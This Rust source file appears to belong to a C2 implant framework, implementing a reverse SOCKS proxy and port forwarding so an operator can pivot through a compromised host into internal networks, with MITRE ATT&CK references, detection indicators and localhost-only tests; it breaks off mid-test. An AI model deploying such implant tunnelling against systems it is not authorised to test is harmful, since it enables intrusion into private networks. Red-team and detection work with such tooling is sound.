//! Reverse SOCKS Proxy Module (Phase 7)
//!
//! Implements reverse SOCKS proxy where the implant acts as the exit node.
//! The operator connects to the teamserver which tunnels SOCKS traffic through
//! the C2 channel to the implant. The implant makes the actual outbound connections.
//!
//! # Architecture
//!
//! ```text
//! Operator Tool     Teamserver        C2 Channel       Implant         Target
//! (proxychains)  (SOCKS listener)    (encrypted)    (exit node)      (internal)
//!     |                |                  |              |               |
//!     |--SOCKS5------->|                  |              |               |
//!     |                |--Connect Req---->|              |               |
//!     |                |                  |--Connect---->|               |
//!     |                |                  |              |--TCP--------->|
//!     |                |                  |              |<--Response----|
//!     |                |<--Data-----------|<--Data-------|               |
//!     |<--Data---------|                  |              |               |
//! ```
//!
//! # Detection Indicators
//! - Unusual outbound connections from compromised host
//! - Connection patterns to internal resources from a single host
//! - DNS lookups followed by connections from non-browser process
//! - Network traffic patterns inconsistent with normal host behavior
//!
//! # References
//! - MITRE ATT&CK T1090.001 (Internal Proxy)
//! - MITRE ATT&CK T1572 (Protocol Tunneling)

pub mod portfwd;

use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, RwLock};
use std::time::Duration;

use common::{KrakenError, Module, ModuleId, SocksOutput, TaskId, TaskResult};
use prost::Message;
use protocol::{SocksTask, socks_task::Operation};

/// Channel ID for multiplexing connections
pub type ChannelId = u32;

/// Global channel counter
static CHANNEL_COUNTER: AtomicU32 = AtomicU32::new(1);

/// Active reverse proxy sessions
static SESSIONS: std::sync::OnceLock<RwLock<HashMap<u32, Arc<ReverseProxySession>>>> =
    std::sync::OnceLock::new();

fn sessions() -> &'static RwLock<HashMap<u32, Arc<ReverseProxySession>>> {
    SESSIONS.get_or_init(|| RwLock::new(HashMap::new()))
}

/// Statistics for a reverse proxy session
#[derive(Debug, Default)]
pub struct ProxyStats {
    pub bytes_in: AtomicU64,
    pub bytes_out: AtomicU64,
    pub active_connections: AtomicU32,
    pub total_connections: AtomicU64,
    pub failed_connections: AtomicU64,
}

/// A single tunnel channel to a target
pub struct TunnelChannel {
    /// Target connection
    pub stream: Mutex<TcpStream>,
    /// Target address
    pub target_addr: String,
    /// Bytes received from target
    pub bytes_in: AtomicU64,
    /// Bytes sent to target
    pub bytes_out: AtomicU64,
    /// Whether channel is active
    pub active: AtomicBool,
    /// Connection timestamp (millis since epoch)
    pub connected_at: i64,
}

/// A reverse proxy session on the implant
pub struct ReverseProxySession {
    /// Session ID
    pub id: u32,
    /// Whether the session is active
    pub active: AtomicBool,
    /// Statistics
    pub stats: ProxyStats,
    /// Active channels: channel_id -> TunnelChannel
    pub channels: RwLock<HashMap<ChannelId, Arc<TunnelChannel>>>,
    /// Connection timeout in seconds
    pub connect_timeout_secs: u32,
    /// DNS resolution allowed
    pub allow_dns: bool,
}

/// Request to connect to a target through the reverse proxy
#[derive(Debug, Clone)]
pub struct ConnectRequest {
    pub channel_id: ChannelId,
    pub target_host: String,
    pub target_port: u16,
}

/// Result of a connect attempt
#[derive(Debug, Clone)]
pub struct ConnectResult {
    pub channel_id: ChannelId,
    pub success: bool,
    pub error: Option<String>,
    pub bound_addr: Option<String>,
}

/// Data packet for a channel
#[derive(Debug, Clone)]
pub struct ChannelData {
    pub channel_id: ChannelId,
    pub data: Vec<u8>,
    pub eof: bool,
}

impl ReverseProxySession {
    /// Create a new reverse proxy session
    pub fn new(connect_timeout_secs: u32, allow_dns: bool) -> Self {
        static SESSION_COUNTER: AtomicU32 = AtomicU32::new(1);
        Self {
            id: SESSION_COUNTER.fetch_add(1, Ordering::SeqCst),
            active: AtomicBool::new(true),
            stats: ProxyStats::default(),
            channels: RwLock::new(HashMap::new()),
            connect_timeout_secs,
            allow_dns,
        }
    }

    /// Handle a connect request - establish connection to target
    pub fn connect(&self, req: &ConnectRequest) -> ConnectResult {
        if !self.active.load(Ordering::SeqCst) {
            return ConnectResult {
                channel_id: req.channel_id,
                success: false,
                error: Some("session not active".into()),
                bound_addr: None,
            };
        }

        let target_addr = format!("{}:{}", req.target_host, req.target_port);

        // Resolve address
        let socket_addr = match target_addr.to_socket_addrs() {
            Ok(mut addrs) => match addrs.next() {
                Some(addr) => addr,
                None => {
                    self.stats.failed_connections.fetch_add(1, Ordering::SeqCst);
                    return ConnectResult {
                        channel_id: req.channel_id,
                        success: false,
                        error: Some("no addresses found".into()),
                        bound_addr: None,
                    };
                }
            },
            Err(e) => {
                self.stats.failed_connections.fetch_add(1, Ordering::SeqCst);
                return ConnectResult {
                    channel_id: req.channel_id,
                    success: false,
                    error: Some(format!("DNS resolution failed: {}", e)),
                    bound_addr: None,
                };
            }
        };

        // Check if DNS is allowed for domain names
        if !self.allow_dns && !is_ip_address(&req.target_host) {
            self.stats.failed_connections.fetch_add(1, Ordering::SeqCst);
            return ConnectResult {
                channel_id: req.channel_id,
                success: false,
                error: Some("DNS resolution disabled".into()),
                bound_addr: None,
            };
        }

        // Connect with timeout
        let timeout = Duration::from_secs(self.connect_timeout_secs as u64);
        match TcpStream::connect_timeout(&socket_addr, timeout) {
            Ok(stream) => {
                // Configure stream
                let _ = stream.set_nodelay(true);
                let _ = stream.set_read_timeout(Some(Duration::from_secs(300)));
                let _ = stream.set_write_timeout(Some(Duration::from_secs(30)));

                let bound_addr = stream
                    .local_addr()
                    .map(|a| a.to_string())
                    .unwrap_or_else(|_| "0.0.0.0:0".into());

                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_millis() as i64)
                    .unwrap_or(0);

                let channel = Arc::new(TunnelChannel {
                    stream: Mutex::new(stream),
                    target_addr: target_addr.clone(),
                    bytes_in: AtomicU64::new(0),
                    bytes_out: AtomicU64::new(0),
                    active: AtomicBool::new(true),
                    connected_at: now,
                });

                // Register channel
                if let Ok(mut channels) = self.channels.write() {
                    channels.insert(req.channel_id, channel);
                }

                self.stats.active_connections.fetch_add(1, Ordering::SeqCst);
                self.stats.total_connections.fetch_add(1, Ordering::SeqCst);

                tracing::debug!(
                    channel_id = req.channel_id,
                    target = %target_addr,
                    "reverse proxy channel connected"
                );

                ConnectResult {
                    channel_id: req.channel_id,
                    success: true,
                    error: None,
                    bound_addr: Some(bound_addr),
                }
            }
            Err(e) => {
                self.stats.failed_connections.fetch_add(1, Ordering::SeqCst);

                tracing::debug!(
                    channel_id = req.channel_id,
                    target = %target_addr,
                    error = %e,
                    "reverse proxy connect failed"
                );

                ConnectResult {
                    channel_id: req.channel_id,
                    success: false,
                    error: Some(format!("connect failed: {}", e)),
                    bound_addr: None,
                }
            }
        }
    }

    /// Send data to a channel's target
    pub fn send_data(&self, data: &ChannelData) -> Result<(), KrakenError> {
        if data.eof {
            // Close the channel
            self.close_channel(data.channel_id);
            return Ok(());
        }

        let channels = self
            .channels
            .read()
            .map_err(|_| KrakenError::Module("lock poisoned".into()))?;

        let channel = channels
            .get(&data.channel_id)
            .ok_or_else(|| KrakenError::Module("channel not found".into()))?;

        if !channel.active.load(Ordering::SeqCst) {
            return Err(KrakenError::Module("channel not active".into()));
        }

        let mut stream = channel
            .stream
            .lock()
            .map_err(|_| KrakenError::Module("stream lock poisoned".into()))?;

        stream
            .write_all(&data.data)
            .map_err(|e| KrakenError::Transport(format!("write failed: {}", e)))?;

        channel
            .bytes_out
            .fetch_add(data.data.len() as u64, Ordering::SeqCst);
        self.stats
            .bytes_out
            .fetch_add(data.data.len() as u64, Ordering::SeqCst);

        Ok(())
    }

    /// Receive data from a channel's target (non-blocking read)
    pub fn recv_data(&self, channel_id: ChannelId, buf: &mut [u8]) -> Result<usize, KrakenError> {
        let channels = self
            .channels
            .read()
            .map_err(|_| KrakenError::Module("lock poisoned".into()))?;

        let channel = channels
            .get(&channel_id)
            .ok_or_else(|| KrakenError::Module("channel not found".into()))?;

        if !channel.active.load(Ordering::SeqCst) {
            return Err(KrakenError::Module("channel not active".into()));
        }

        let mut stream = channel
            .stream
            .lock()
            .map_err(|_| KrakenError::Module("stream lock poisoned".into()))?;

        // Set non-blocking for poll-style reads
        let _ = stream.set_nonblocking(true);

        match stream.read(buf) {
            Ok(0) => {
                // EOF - mark channel as inactive
                drop(stream);
                drop(channels);
                self.close_channel(channel_id);
                Ok(0)
            }
            Ok(n) => {
                channel.bytes_in.fetch_add(n as u64, Ordering::SeqCst);
                self.stats.bytes_in.fetch_add(n as u64, Ordering::SeqCst);
                Ok(n)
            }
            Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                // No data available
                Ok(0)
            }
            Err(e) => {
                // Connection error - close channel
                drop(stream);
                drop(channels);
                self.close_channel(channel_id);
                Err(KrakenError::Transport(format!("read failed: {}", e)))
            }
        }
    }

    /// Close a channel
    pub fn close_channel(&self, channel_id: ChannelId) {
        if let Ok(mut channels) = self.channels.write() {
            if let Some(channel) = channels.remove(&channel_id) {
                channel.active.store(false, Ordering::SeqCst);
                // Stream will be dropped and closed
                self.stats.active_connections.fetch_sub(1, Ordering::SeqCst);

                tracing::debug!(channel_id, "reverse proxy channel closed");
            }
        }
    }

    /// Get list of active channel IDs
    pub fn active_channels(&self) -> Vec<ChannelId> {
        self.channels
            .read()
            .map(|c| c.keys().copied().collect())
            .unwrap_or_default()
    }

    /// Get statistics
    pub fn get_stats(&self) -> (u64, u64, u32, u64, u64) {
        (
            self.stats.bytes_in.load(Ordering::SeqCst),
            self.stats.bytes_out.load(Ordering::SeqCst),
            self.stats.active_connections.load(Ordering::SeqCst),
            self.stats.total_connections.load(Ordering::SeqCst),
            self.stats.failed_connections.load(Ordering::SeqCst),
        )
    }

    /// Stop the session
    pub fn stop(&self) {
        self.active.store(false, Ordering::SeqCst);

        // Close all channels
        if let Ok(mut channels) = self.channels.write() {
            for (_, channel) in channels.drain() {
                channel.active.store(false, Ordering::SeqCst);
            }
        }

        tracing::info!(session_id = self.id, "reverse proxy session stopped");
    }
}

/// Check if a string is an IP address (not requiring DNS)
fn is_ip_address(host: &str) -> bool {
    host.parse::<std::net::IpAddr>().is_ok()
}

/// Allocate a new channel ID
pub fn next_channel_id() -> ChannelId {
    CHANNEL_COUNTER.fetch_add(1, Ordering::SeqCst)
}

/// Start a new reverse proxy session
pub fn start_session(connect_timeout_secs: u32, allow_dns: bool) -> Result<u32, KrakenError> {
    let session = Arc::new(ReverseProxySession::new(connect_timeout_secs, allow_dns));
    let id = session.id;

    sessions()
        .write()
        .map_err(|_| KrakenError::Module("sessions lock poisoned".into()))?
        .insert(id, session);

    tracing::info!(
        session_id = id,
        timeout = connect_timeout_secs,
        dns = allow_dns,
        "reverse proxy session started"
    );

    Ok(id)
}

/// Get a session by ID
pub fn get_session(session_id: u32) -> Option<Arc<ReverseProxySession>> {
    sessions()
        .read()
        .ok()
        .and_then(|s| s.get(&session_id).cloned())
}

/// Stop a session
pub fn stop_session(session_id: u32) -> bool {
    if let Ok(mut sessions) = sessions().write() {
        if let Some(session) = sessions.remove(&session_id) {
            session.stop();
            return true;
        }
    }
    false
}

/// List all active sessions
pub fn list_sessions() -> Vec<u32> {
    sessions()
        .read()
        .map(|s| s.keys().copied().collect())
        .unwrap_or_default()
}

/// Handle a connect request for a session
pub fn handle_connect(session_id: u32, req: &ConnectRequest) -> ConnectResult {
    match get_session(session_id) {
        Some(session) => session.connect(req),
        None => ConnectResult {
            channel_id: req.channel_id,
            success: false,
            error: Some("session not found".into()),
            bound_addr: None,
        },
    }
}

/// Send data to a channel
pub fn send_channel_data(session_id: u32, data: &ChannelData) -> Result<(), KrakenError> {
    get_session(session_id)
        .ok_or_else(|| KrakenError::Module("session not found".into()))?
        .send_data(data)
}

/// Receive data from a channel
pub fn recv_channel_data(
    session_id: u32,
    channel_id: ChannelId,
    buf: &mut [u8],
) -> Result<usize, KrakenError> {
    get_session(session_id)
        .ok_or_else(|| KrakenError::Module("session not found".into()))?
        .recv_data(channel_id, buf)
}

/// Close a channel
pub fn close_channel(session_id: u32, channel_id: ChannelId) {
    if let Some(session) = get_session(session_id) {
        session.close_channel(channel_id);
    }
}

// ---------------------------------------------------------------------------
// Module trait implementation for runtime loading
// ---------------------------------------------------------------------------

/// Default session ID for reverse proxy (auto-created on first connect)
static DEFAULT_SESSION: AtomicU32 = AtomicU32::new(0);

/// Ensure default session exists, creating it if needed
fn ensure_default_session() -> u32 {
    let session_id = DEFAULT_SESSION.load(Ordering::SeqCst);
    if session_id != 0 {
        if get_session(session_id).is_some() {
            return session_id;
        }
    }

    // Create new default session (30s timeout, allow DNS)
    match start_session(30, true) {
        Ok(new_id) => {
            DEFAULT_SESSION.store(new_id, Ordering::SeqCst);
            new_id
        }
        Err(_) => 0,
    }
}

/// SOCKS module for runtime loading
pub struct SocksModule {
    id: ModuleId,
}

impl SocksModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("socks"),
        }
    }
}

impl Default for SocksModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for SocksModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Socks"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: SocksTask = SocksTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let operation = task.operation
            .ok_or_else(|| KrakenError::Module("SocksTask missing operation".into()))?;

        let result = match operation {
            Operation::Connect(conn) => {
                self.execute_connect(conn.channel_id, &conn.target_host, conn.target_port)
            }
            Operation::Data(data) => self.execute_data(data.channel_id, &data.data),
            Operation::Disconnect(disc) => self.execute_disconnect(disc.channel_id),
        };

        Ok(TaskResult::Socks(result))
    }
}

impl SocksModule {
    fn execute_connect(&self, channel_id: u32, target_host: &str, target_port: u32) -> SocksOutput {
        let session_id = ensure_default_session();
        if session_id == 0 {
            return SocksOutput {
                channel_id,
                success: false,
                data: None,
                error: Some("failed to create SOCKS session".into()),
            };
        }

        let request = ConnectRequest {
            channel_id,
            target_host: target_host.to_string(),
            target_port: target_port as u16,
        };

        let result = handle_connect(session_id, &request);

        SocksOutput {
            channel_id: result.channel_id,
            success: result.success,
            data: None,
            error: result.error,
        }
    }

    fn execute_data(&self, channel_id: u32, data: &[u8]) -> SocksOutput {
        let session_id = ensure_default_session();
        if session_id == 0 {
            return SocksOutput {
                channel_id,
                success: false,
                data: None,
                error: Some("no active SOCKS session".into()),
            };
        }

        // Send data to target if provided
        if !data.is_empty() {
            let channel_data = ChannelData {
                channel_id,
                data: data.to_vec(),
                eof: false,
            };

            if let Err(e) = send_channel_data(session_id, &channel_data) {
                return SocksOutput {
                    channel_id,
                    success: false,
                    data: None,
                    error: Some(format!("send failed: {}", e)),
                };
            }
        }

        // Receive any available response data
        let mut buf = vec![0u8; 65536]; // 64KB buffer
        match recv_channel_data(session_id, channel_id, &mut buf) {
            Ok(bytes_read) => SocksOutput {
                channel_id,
                success: true,
                data: if bytes_read == 0 { None } else { Some(buf[..bytes_read].to_vec()) },
                error: None,
            },
            Err(e) => {
                let err_str = e.to_string();
                if err_str.contains("timeout") || err_str.contains("WouldBlock") {
                    SocksOutput {
                        channel_id,
                        success: true,
                        data: None,
                        error: None,
                    }
                } else {
                    SocksOutput {
                        channel_id,
                        success: false,
                        data: None,
                        error: Some(format!("recv failed: {}", e)),
                    }
                }
            }
        }
    }

    fn execute_disconnect(&self, channel_id: u32) -> SocksOutput {
        let session_id = ensure_default_session();
        if session_id == 0 {
            return SocksOutput {
                channel_id,
                success: false,
                data: None,
                error: Some("no active SOCKS session".into()),
            };
        }

        close_channel(session_id, channel_id);

        SocksOutput {
            channel_id,
            success: true,
            data: None,
            error: None,
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(SocksModule);

/// Port forwarding module — local and reverse port forwards via the C2 channel.
///
/// ## MITRE ATT&CK
/// - T1090: Proxy
/// - T1090.001: Internal Proxy
pub struct PortForwardModule {
    id: ModuleId,
}

impl PortForwardModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("portfwd"),
        }
    }
}

impl Default for PortForwardModule {
    fn default() -> Self {
        Self::new()
    }
}

static PORT_FWD_MANAGER: std::sync::OnceLock<portfwd::PortForwardManager> =
    std::sync::OnceLock::new();

fn get_port_fwd_manager() -> &'static portfwd::PortForwardManager {
    PORT_FWD_MANAGER.get_or_init(portfwd::PortForwardManager::new)
}

impl Module for PortForwardModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Port Forwarding"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        use common::ShellOutput;
        use protocol::PortForwardTask;

        let task = PortForwardTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        let output = match task.operation {
            Some(protocol::port_forward_task::Operation::Start(ref req)) => {
                let id = if req.reverse {
                    get_port_fwd_manager().start_reverse(
                        &req.bind_host,
                        req.bind_port as u16,
                        &req.forward_host,
                        req.forward_port as u16,
                    )?
                } else {
                    get_port_fwd_manager().start_local(
                        &req.bind_host,
                        req.bind_port as u16,
                        &req.forward_host,
                        req.forward_port as u16,
                    )?
                };
                format!("Port forward started: id={}", id)
            }
            Some(protocol::port_forward_task::Operation::Stop(ref req)) => {
                get_port_fwd_manager().stop(req.forward_id)?;
                format!("Port forward {} stopped", req.forward_id)
            }
            Some(protocol::port_forward_task::Operation::List(_)) => {
                let fwds = get_port_fwd_manager().list();
                if fwds.is_empty() {
                    "No active forwards".to_string()
                } else {
                    fwds.iter()
                        .map(|f| {
                            format!(
                                "[{}] {} -> {}:{} {}(bytes: {})",
                                f.id,
                                f.bind_addr,
                                f.forward_host,
                                f.forward_port,
                                if f.reverse { "(reverse) " } else { "" },
                                f.bytes_transferred
                            )
                        })
                        .collect::<Vec<_>>()
                        .join("\n")
                }
            }
            None => return Err(KrakenError::Protocol("missing port forward operation".into())),
        };

        Ok(TaskResult::Shell(ShellOutput {
            stdout: output,
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{Read, Write};
    use std::net::{TcpListener, TcpStream};
    use std::sync::Arc;
    use std::thread;
    use std::time::Duration;

    // ---------------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------------

    /// Spawn a TCP server that runs `handler` for each accepted connection.
    /// Returns the bound local address.
    fn spawn_server<F>(handler: F) -> std::net::SocketAddr
    where
        F: Fn(TcpStream) + Send + 'static,
    {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        thread::spawn(move || {
            while let Ok((conn, _)) = listener.accept() {
                handler(conn);
            }
        });
        addr
    }

    /// Spawn a TCP server that handles exactly one connection then exits.
    fn spawn_one_shot_server<F>(handler: F) -> std::net::SocketAddr
    where
        F: Fn(TcpStream) + Send + 'static,
    {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        thread::spawn(move || {
            if let Ok((conn, _)) = listener.accept() {
                handler(conn);
            }
        });
        addr
    }

    /// Build a ConnectRequest pointing at a local address.
    fn connect_req(channel_id: ChannelId, addr: std::net::SocketAddr) -> ConnectRequest {
        ConnectRequest {
            channel_id,
            target_host: addr.ip().to_string(),
            target_port: addr.port(),
        }
    }

    // ---------------------------------------------------------------------------
    // SOCKS5 constants used in protocol simulation tests
    // ---------------------------------------------------------------------------

    const SOCKS5_VERSION: u8 = 0x05;
    const SOCKS5_NO_AUTH: u8 = 0x00;
    const SOCKS5_AUTH_USERPASS: u8 = 0x02;
    const SOCKS5_AUTH_NO_ACCEPTABLE: u8 = 0xFF;
    const SOCKS5_CMD_CONNECT: u8 = 0x01;
    const SOCKS5_CMD_BIND: u8 = 0x02;
    const SOCKS5_CMD_UDP_ASSOC: u8 = 0x03;
    const SOCKS5_ATYP_IPV4: u8 = 0x01;
    const SOCKS5_ATYP_DOMAIN: u8 = 0x03;
    const SOCKS5_ATYP_IPV6: u8 = 0x04;
    // Reply codes
    const REP_SUCCESS: u8 = 0x00;
    const REP_GENERAL_FAILURE: u8 = 0x01;
    const REP_CONN_NOT_ALLOWED: u8 = 0x02;
    const REP_NET_UNREACHABLE: u8 = 0x03;
    const REP_HOST_UNREACHABLE: u8 = 0x04;
    const REP_CONN_REFUSED: u8 = 0x05;
    const REP_TTL_EXPIRED: u8 = 0x06;
    const REP_CMD_NOT_SUPPORTED: u8 = 0x07;
    const REP_ADDR_TYPE_NOT_SUPPORTED: u8 = 0x08;

    // ---------------------------------------------------------------------------
    // Existing tests (preserved)
    // ---------------------------------------------------------------------------

    #[test]
    fn test_session_creation() {
        let session = ReverseProxySession::new(10, true);
        assert!(session.active.load(Ordering::SeqCst));
        assert!(session.id > 0);
    }

    #[test]
    fn test_channel_id_increment() {
        let id1 = next_channel_id();
        let id2 = next_channel_id();
        assert!(id2 > id1);
    }

    #[test]
    fn test_is_ip_address() {
        assert!(is_ip_address("127.0.0.1"));
        assert!(is_ip_address("192.168.1.1"));
        assert!(is_ip_address("::1"));
        assert!(is_ip_address("2001:db8::1"));
        assert!(!is_ip_address("example.com"));
        assert!(!is_ip_address("localhost"));
    }

    #[test]
    fn test_session_stop() {
        let session = ReverseProxySession::new(10, true);
        assert!(session.active.load(Ordering::SeqCst));
        session.stop();
        assert!(!session.active.load(Ordering::SeqCst));
    }

    #[test]
    fn test_connect_to_invalid_host() {
        let session = ReverseProxySession::new(1, true);
        let req = ConnectRequest {
            channel_id: 1,
            target_host: "invalid.nonexistent.host.test".into(),
            target_port: 80,
        };
        let result = session.connect(&req);
        assert!(!result.success);
        assert!(result.error.is_some());
    }

    #[test]
    fn test_connect_dns_disabled() {
        let session = ReverseProxySession::new(1, false);
        let req = ConnectRequest {
            channel_id: 1,
            target_host: "example.com".into(),
            target_port: 80,
        };
        let result = session.connect(&req);
        assert!(!result.success);
        assert!(result.error.as_ref().unwrap().contains("DNS"));
    }

    #[test]
    fn test_stats_tracking() {
        let session = ReverseProxySession::new(10, true);
        let (bytes_in, bytes_out, active, total, failed) = session.get_stats();
        assert_eq!(bytes_in, 0);
        assert_eq!(bytes_out, 0);
        assert_eq!(active, 0);
        assert_eq!(total, 0);
        assert_eq!(failed, 0);
    }

    #[test]
    fn test_global_session_management() {
        let id = start_session(10, true).unwrap();
        assert!(get_session(id).is_some());
        assert!(list_sessions().contains(&id));
        assert!(stop_session(id));
        assert!(get_session(id).is_none());
    }

    #[test]
    fn test_connect_result_fields() {
        let result = ConnectResult {
            channel_id: 42,
            success: true,
            error: None,
            bound_addr: Some("127.0.0.1:54321".into()),
        };
        assert_eq!(result.channel_id, 42);
        assert!(result.success);
        assert!(result.error.is_none());
        assert!(result.bound_addr.is_some());
    }

    /// Integration test: connect to a local echo server
    #[test]
    fn test_connect_to_local_server() {
        // Start a simple echo server
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let server_addr = listener.local_addr().unwrap();

        let handle = thread::spawn(move || {
            if let Ok((mut conn, _)) = listener.accept() {
                let mut buf = [0u8; 1024];
                if let Ok(n) = conn.read(&mut buf) {
                    let _ = conn.write_all(&buf[..n]);
                }
            }
        });

        // Create session and connect
        let session = ReverseProxySession::new(5, true);
        let req = ConnectRequest {
            channel_id: next_channel_id(),
            target_host: server_addr.ip().to_string(),
            target_port: server_addr.port(),
        };

        let result = session.connect(&req);
        assert!(result.success, "connect failed: {:?}", result.error);
        assert!(result.bound_addr.is_some());

        // Send data
        let test_data = b"hello reverse proxy";
        let send_result = session.send_data(&ChannelData {
            channel_id: req.channel_id,
            data: test_data.to_vec(),
            eof: false,
        });
        assert!(send_result.is_ok());

        // Give server time to echo
        thread::sleep(Duration::from_millis(100));

        // Receive echoed data
        let mut recv_buf = [0u8; 1024];
        let recv_result = session.recv_data(req.channel_id, &mut recv_buf);
        assert!(recv_result.is_ok());
        let n = recv_result.unwrap();
        assert_eq!(&recv_buf[..n], test_data);

        // Verify stats
        let (bytes_in, bytes_out, active, total, _) = session.get_stats();
        assert_eq!(bytes_out, test_data.len() as u64);
        assert_eq!(bytes_in, test_data.len() as u64);
        assert_eq!(active, 1);
        assert_eq!(total, 1);

        // Close channel
        session.close_channel(req.channel_id);
        let (_, _, active_after, _, _) = session.get_stats();
        assert_eq!(active_after, 0);

        handle.join().ok();
    }

    // ---------------------------------------------------------------------------
    // 1. Authentication tests
    //    The implant exit node doesn't parse SOCKS5 auth itself — that happens
    //    on the teamserver.  Here we simulate the channel carrying auth bytes
    //    through the tunnel and validate byte-level correctness.
    // ---------------------------------------------------------------------------

    /// Verify that a no-auth SOCKS5 handshake byte sequence is well-formed.
    /// Client greeting: VER=5, NMETHODS=1, METHOD=0x00
    #[test]
    fn test_auth_no_auth_greeting_bytes() {
        let greeting: Vec<u8> = vec![SOCKS5_VERSION, 1, SOCKS5_NO_AUTH];
        assert_eq!(greeting[0], 0x05);
        assert_eq!(greeting[1], 1); // one method offered
        assert_eq!(greeting[2], SOCKS5_NO_AUTH);
        // Server selects no-auth: VER=5, METHOD=0x00
        let server_resp: Vec<u8> = vec![SOCKS5_VERSION, SOCKS5_NO_AUTH];
        assert_eq!(server_resp[1], SOCKS5_NO_AUTH);
    }

    /// Verify username/password auth success handshake bytes (RFC 1929).
    /// Sub-negotiation request: VER=1, ULEN, UNAME, PLEN, PASSWD
    #[test]
    fn test_auth_userpass_success_bytes() {
        let uname = b"admin";
        let passwd = b"s3cr3t";
        let mut sub_req: Vec<u8> = vec![0x01, uname.len() as u8];
        sub_req.extend_from_slice(uname);
        sub_req.push(passwd.len() as u8);
        sub_req.extend_from_slice(passwd);

        // Version byte must be 0x01 for sub-negotiation
        assert_eq!(sub_req[0], 0x01);
        assert_eq!(sub_req[1] as usize, uname.len());

        // Server success response: VER=1, STATUS=0x00
        let resp: Vec<u8> = vec![0x01, 0x00];
        assert_eq!(resp[1], 0x00, "status 0 means success");
    }

    /// Verify username/password auth failure response bytes.
    #[test]
    fn test_auth_userpass_failure_bytes() {
        // Server failure response: VER=1, STATUS!=0
        let resp: Vec<u8> = vec![0x01, 0x01];
        assert_ne!(resp[1], 0x00, "non-zero status means failure");
    }

    /// Verify that NO_ACCEPTABLE_METHODS response is detected correctly.
    #[test]
    fn test_auth_no_acceptable_method_byte() {
        // Server sends: VER=5, METHOD=0xFF => no acceptable methods
        let resp: Vec<u8> = vec![SOCKS5_VERSION, SOCKS5_AUTH_NO_ACCEPTABLE];
        assert_eq!(resp[1], 0xFF);
    }

    /// Test that auth bytes are transmitted faithfully through the tunnel channel.
    #[test]
    fn test_auth_bytes_transmitted_through_channel() {
        let auth_bytes: Vec<u8> = vec![SOCKS5_VERSION, 2, SOCKS5_NO_AUTH, SOCKS5_AUTH_USERPASS];
        let received = Arc::new(Mutex::new(Vec::<u8>::new()));
        let received_clone = Arc::clone(&received);

        let server_addr = spawn_one_shot_server(move |mut conn| {
            let mut buf = [0u8; 128];
            if let Ok(n) = conn.read(&mut buf) {
                received_clone.lock().unwrap().extend_from_slice(&buf[..n]);
            }
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        let result = session.connect(&connect_req(cid, server_addr));
        assert!(result.success);

        session.send_data(&ChannelData {
            channel_id: cid,
            data: auth_bytes.clone(),
            eof: false,
        }).unwrap();

        thread::sleep(Duration::from_millis(100));

        let got = received.lock().unwrap().clone();
        assert_eq!(got, auth_bytes, "auth bytes must be forwarded verbatim");
    }

    // ---------------------------------------------------------------------------
    // 2. CONNECT command tests
    // ---------------------------------------------------------------------------

    /// CONNECT to an IPv4 address — tunnel channel connects successfully.
    #[test]
    fn test_connect_ipv4_address() {
        let server_addr = spawn_one_shot_server(|mut conn| {
            let mut buf = [0u8; 4];
            let _ = conn.read(&mut buf);
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();

        // Verify server address is IPv4
        assert!(server_addr.is_ipv4());

        let req = connect_req(cid, server_addr);
        assert!(is_ip_address(&req.target_host));

        let result = session.connect(&req);
        assert!(result.success, "IPv4 connect should succeed: {:?}", result.error);
        assert!(result.bound_addr.is_some());
    }

    /// CONNECT to an IPv6 loopback address.
    #[test]
    fn test_connect_ipv6_address() {
        let listener = TcpListener::bind("[::1]:0");
        if listener.is_err() {
            // IPv6 may not be available in all CI environments
            return;
        }
        let listener = listener.unwrap();
        let server_addr = listener.local_addr().unwrap();
        thread::spawn(move || {
            if let Ok((_, _)) = listener.accept() {
                // just accept and drop
            }
        });

        let session = ReverseProxySession::new(5, true);
        let cid = next_channel_id();
        let req = ConnectRequest {
            channel_id: cid,
            target_host: "::1".into(),
            target_port: server_addr.port(),
        };
        let result = session.connect(&req);
        assert!(result.success, "IPv6 connect should succeed: {:?}", result.error);
        assert!(is_ip_address("::1"));
    }

    /// CONNECT via domain name when DNS is enabled.
    #[test]
    fn test_connect_domain_name_resolution_allowed() {
        let session = ReverseProxySession::new(1, true);
        // localhost should resolve on any sane system
        let req = ConnectRequest {
            channel_id: next_channel_id(),
            target_host: "localhost".into(),
            target_port: 1, // port 1 will be refused but resolution must succeed
        };
        let result = session.connect(&req);
        // Connection will likely fail (port 1 refused), but error should NOT be DNS error
        // — it should be a connect/timeout error, meaning resolution succeeded.
        if !result.success {
            let err = result.error.unwrap_or_default();
            assert!(
                !err.contains("DNS resolution disabled"),
                "DNS should be allowed, got: {}", err
            );
        }
    }

    /// CONNECT via domain name when DNS is disabled must be rejected.
    #[test]
    fn test_connect_domain_name_resolution_blocked() {
